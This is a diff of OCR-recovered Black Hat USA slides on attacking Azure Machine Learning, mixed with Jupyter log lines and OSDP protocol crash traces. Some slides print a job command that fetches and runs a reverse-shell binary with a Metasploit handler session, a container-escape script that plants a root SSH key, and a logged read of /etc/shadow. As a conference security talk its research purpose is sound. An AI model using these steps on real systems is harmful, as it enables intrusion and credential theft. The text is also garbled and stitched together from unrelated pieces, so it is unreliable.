-31 19:38:01 zdiamltest jupyter[8180]: 2022-10-31 19:38:01.798 ServerApp] notebook_shim | extension was successfully linked
-31 19 701 zdiamltest jupyter[8180]: 2022-10-31 19:38:01.789 ServerApp] azureml-samples.handlers | extension was successfully linked
-] ]
-] ]
-]
-]
-]
-]
-]
-]
-]
-]
-]
-]
-]
-]
-]
-31 19:38:03 zdiamltest jupyter[8180]: 2022-10-31 19:38:03.506 ServerApp] http://localhost:8888/
-]
-]
-]
-]
-]
-]
-]
-]
-]
-]
-31 :01 zdiamltest jupyter[8180]: 2022-10-31 19:38:01.789 ServerApp] azureml-samples.handlers | extension was found and enabled by notebook_shim. Consider moving the extension to Jupyter pver'’s extension paths
-31 :58 zdiamltest jupyter[818@]: 2022-10-31 19:37:58.927 ServerApp] Writing Jupyter server cookie secret to /home/azureuser/.local/share/jupyter/runtime/jupyter_cookie_ secret
-31 19 258 zdiamltest jupyter[8180]: 2022-10-31 19:37:58.925 ServerApp] nbdime | extension was successfully linked.
-31 19:37:58 zdiamltest jupyter[81380]: 2022-16-31 19:37:58.925 ServerApp] nbclassic | extension was successfully linked
-31 19:37:58 zdiamltest jupyter[8180]: 2022-10-31 19 758.918 ServerApp] jupytext | extension was successfully linked
-#BHUSA @BlackHatEvents
+DEMO - Crashing the CP's OSDP Service
+
+door close
+
+[terminal tabs] 6. kali_tty (1)   8. kali_tty (1)   9. kali_tty (1)
+
+cp -> pd: b'536007000060e6'
+cp -> pd: b'536007000060e6'
+cp -> pd: b'536107000060e5'
+cp -> pd: b'536107000060e5'
+cp -> pd: b'536207000060e4'
+cp -> pd: b'536207000060e4'
+cp -> pd: b'536307000060e3'
+cp -> pd: b'536307000060e3'
+cp -> pd: b'536407000060e2'
+cp -> pd: b'536407000060e2'
+cp -> pd: b'536507000060e1'
+cp -> pd: b'536507000060e1'
+pd -> cp: b'53e50700004081'
+pd -> cp: b'53e50700004081'
+cp -> pd: b'53650800006200de'
+cp -> pd: b'53650800006200de'
+pd -> cp: b'53e53400004601000002000003010004040105020106000007000008010009'
+pd -> cp: b'53e53400004601000002000003010004040105020106000007000008010009'
+***** message is not valid
+pd -> cp: b'01010a92030b92030c00000e00000f00001001009c'
+pd -> cp: b'01010a92030b92030c00000e00000f00001001009c'
+cp -> pd: b'53650900056100e94d'
+cp -> pd: b'53650900056100e94d'
+pd -> cp: b'53e51400054500068e0101f5098036053800b9f7'
+pd -> cp: b'53e51400054500068e0101f5098036053800b9f7'
+cp -> pd: b'536516000669000000000000000000010101010150e4'
+cp -> pd: b'536516000669000000000000000000010101010150e4'
+pd -> cp: b'53e508000640b0f0'
+pd -> cp: b'53e508000640b0f0'
+cp -> pd: b'53650d00076a00020101031e8f'
+cp -> pd: b'53650d00076a00020101031e8f'
+pd -> cp: b'53e50800074081c3'
+pd -> cp: b'53e50800074081c3'
+cp -> pd: b'53651600056900000000000000000001010101011d0c'
+cp -> pd: b'53651600056900000000000000000001010101011d0c'
+pd -> cp: b'53e508000540e3a5'
+pd -> cp: b'53e508000540e3a5'
+cp -> pd: b'53650d00066a0001000000c198'
+cp -> pd: b'53650d00066a0001000000c198'
+pd -> cp: b'53e508000640b0f0'
+pd -> cp: b'53e508000640b0f0'
+cp -> pd: b'53650800076033c5'
+cp -> pd: b'53650800076033c5'
+pd -> cp: b'53e50800074081c3'
+pd -> cp: b'53e50800074081c3'
+cp -> pd: b'53650800056051a3'
+cp -> pd: b'53650800056051a3'
 ```
 
 ## Slide 67
@@ -1388,13 +1123,12 @@ Requirement .parse(‘pillow>=7.1.0'), {‘bokeh'})
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 60/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 blackhat Command logged in Service Log
-USA 20e53
 3 USER=root ; COMMAND=/usr/bin/cat /etc/shadow
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 68
@@ -1426,16 +1160,6 @@ Azure Machine Learning Information Disclosure Vulnerability <u>Demo Video</u>
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-bisek hat
-USA 20e53
-MLSE
-Azure Machine Learning Information Disclosure Vulnerability
-#BHUSA @BlackHatEvents
-```
-
 ## Slide 71
 
 Fixed
@@ -1444,22 +1168,18 @@ Fixed
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
 Azure Machine Learning Information Disclosure Vulnerability
 CVE-2023-28312
 Security Vulnerability
 Released: Apr 11, 2023
 Assigning CNA: © Microsoft
-@rixed
-CVE-2023-28312 4
 Impact: Information Disclosure Max Severity: Important
 CVSS:3.16.5 / 5.7 ©
 https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-28312
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 72
@@ -1500,16 +1220,6 @@ The Funhouse of Experiments: A Rollercoaster Ride
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-bisek hat
-USA 20e53
-The Funhouse of Experiments:
-A Rollercoaster Ride
-#BHUSA @BlackHatEvents
-```
-
 ## Slide 75
 
 #BHUSA @BlackHatEvents
@@ -1548,12 +1258,11 @@ A Rollercoaster Ride
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 piSekhat Creating a training j
-USA 20e53
-&
 @ Compute Compute
 Select an existing compute target
 © Environment
@@ -1566,8 +1275,6 @@ Virtual machine tier ©
 Virtual machine size
 | Standard_DS3_v?2 (4 core(s), 14GB RAM, 28GB storage, $0.43/hr)
 Number of instances
-E
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 79
@@ -1576,11 +1283,10 @@ E
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
 © TrendMicro
 + New
 fa Home
@@ -1591,8 +1297,6 @@ Notebooks
 Assets
 & Data
 A Jobs
-BY Components
-% Pipelines
 & Environments
 @ Models
 @ Endpoints
@@ -1615,13 +1319,11 @@ Version
 Environment operating system
 Linux
 Azure container registry
-niteshamlws.azurecr.io/azureml/azurem|_68a0d87
 82a687d21234133f2402b785a
 Asset ID
 1 FROM debiank latest
 a RUN apt update -y && apt install curl
 weet net-tools ssh -y
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 80
@@ -1644,28 +1346,21 @@ weet net-tools ssh -y
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 pisekchat Fetch a Shell! x
-USA 20e53
 Enter the command to start the job *
-curl https://webhook-site/f1 22bf3f-619d-4aca-90c5-acc9ci9a8636| I
 sleep 30
-waetitce jane “a8! -eo/reverse && chmod +x reverse
 sleep 30
-reverse
-#y
 The command wall run from the reot of the uploaded code folder. Add any parameters and input references as needed.
 msf6 exploit(multi/handler) > run Serving HTTP on 8.9.8.8 port 8986 (http://68.6.6.9:8880/ |
-Paar
 {*] Started reverse TCP handler on 6.6.8.8:8686 26.239.36.32 - - [15/Nov/2622 86:47:36] "GET /reverse H
 [*] Sending stage (3845348 bytes) to 28.239.36.32 |TTP/1.1" 268 -
 {*] Meterpreter session 2 opened (192.168.19.55:8886 -/|*C
 > 26.239.38.32:1625) at 2822-11-15 68:48:16 +9538 Keyboard interrupt received, exiting.
-eee
 $ |
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 82
@@ -1674,12 +1369,10 @@ $ |
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-black hat
-2)
-USA 2025
 Listing running proc
 msf6 expLoit(multi/handler) > run
 [*] Started reverse TCP handler on 6.86.8.98:88880
@@ -1699,23 +1392,18 @@ root 20 98.0 86.0 6752
 STAT START
 Ssl
 Ss
-Ss
 R
 19:17
 19:17
 19:18
 19:18
 TIME
-6:80
-0:00
 8:00
 8:80
 COMMAND
-/nnt/azureml/cr/j/274891a81674423bbbe74
 ./reverse
 \_ /bin/sh
 \_ ps faux
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 83
@@ -1726,11 +1414,11 @@ COMMAND
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 pisekchat Escaping the Contain
-USA 20e53
 <>] aml-jobs-escape.sh
 sudo su
 mkdir -p /hostOS
@@ -1740,7 +1428,6 @@ ssh-keygen -N "" -f /tmp/test
 cat /tmp/test.pub > /root/.ssh/authorized_ keys
 ssh -oStrictHostKeyChecking=no -oBatchMode=yes -i /tmp/test root@127.0.0.1
 Credits: Docker API Honeypots + Percussive Elbow’s docker-escape-tool
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 84
@@ -1812,11 +1499,10 @@ Source: MS Docs
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
 Secure Azure Machine Learning
 workspace resources using
 virtual networks (VNets)
@@ -1832,7 +1518,6 @@ Learning Workspace
 Allow access from
 trusted Azure services
 Azure Storage
-&) Feedback
 Private Service
 Endpoint endpoint
 User client or
@@ -1843,10 +1528,8 @@ Source: MS Docs
 account =m
 Azure Key
 Vault
-si)
 Azure Container
 Registry
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 90
@@ -1855,12 +1538,10 @@ Registry
 
 Use Private Links, Bastion, Endpoints
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
-|
 Azure Batch Service
 Service tag batch/
 Azure Machine
@@ -1870,16 +1551,11 @@ inbound
 (Public)
 Microsoft managed
 Compute
-“= Cluster
 Compute
-“ee instance
 Training subnet
 Customer virtual network
-ra
-DM
 Azure Machine
 Learning Workspace
--
 ¥
 Azure Bastion
 Jumpbox
@@ -1889,11 +1565,9 @@ AzureBastion
 subnet
 Scoring subnet
 Azure Storage
-account
 Allow access from
 trusted Azure
 services
-\ Y Azure
 pt Container
 Registr
 Azure Key ay
@@ -1902,7 +1576,6 @@ Endpoint Endpoint
 Private
 Endpoint
 Use Private Links, Bastion, Endpoints
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 91
@@ -1911,11 +1584,10 @@ Use Private Links, Bastion, Endpoints
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-piGdkhat Network Isolation Options -
-USA 20e53
 Basics Networking — Encryption Identity Tags Review + create
 Network isolation
 Choose the type of network isolation you need for your workspace, from not isolated at all to an entirely separate virtual
@@ -1931,7 +1603,6 @@ unrestricted restricted to approved targets
 Learn more about public
 networks Learn more about private Learn more about data
 networks &@ exfiltration protection 7
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 92
@@ -1956,12 +1627,10 @@ networks &@ exfiltration protection 7
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-Q
-black hat
-USA 20e53
 Reconnaissance
 5 techniques
 &
@@ -1979,7 +1648,6 @@ Execution ® Persistence ® Defense Discovery ®
 2 techniques
 2 techniques
 Evasion
-1 technique 3 techniques
 Collection ® ML Attack
 3 techniques
 Staging
@@ -2012,7 +1680,6 @@ Adversarial ML Model
 Attack
 Capabilities Exploit
 Public-Facing
-Acquire i ination &
 Infrastructure Application
 Publish
 Poisoned
@@ -2099,7 +1766,6 @@ System
 Misuse for
 External
 Effect
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 94
@@ -2110,14 +1776,11 @@ Effect
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-: Fs Foe N/a ee
-> al
-USA 20e53
 Compromised PyTorch Dependency
-Chain ( rrer|
 Incident Date: 25 December 2022 | Reporter: PyTorch
 *% DOWNLOAD DATA +
 Actor: Unknown | Target: PyTorch
@@ -2125,7 +1788,6 @@ Microsoft Azure Service Disruption
 Incident Date: 2020
 Actor: Microsoft Al Red Team | Target: Internal Microsoft Azure Service
 Case Studies of attacks on ML systems
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 95
@@ -2139,16 +1801,6 @@ David Fiser (@anu4is)
 Magno Oliveira (@magnologan)
 
 #BHUSA @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-piiekhat Acknowledgements. -— :
-USA 20e53
-OTREND: — @ iia
-David Fiser (@anu4is) @thezdi
-Magno Oliveira (@magnologan)
-```
 
 ## Slide 96
 
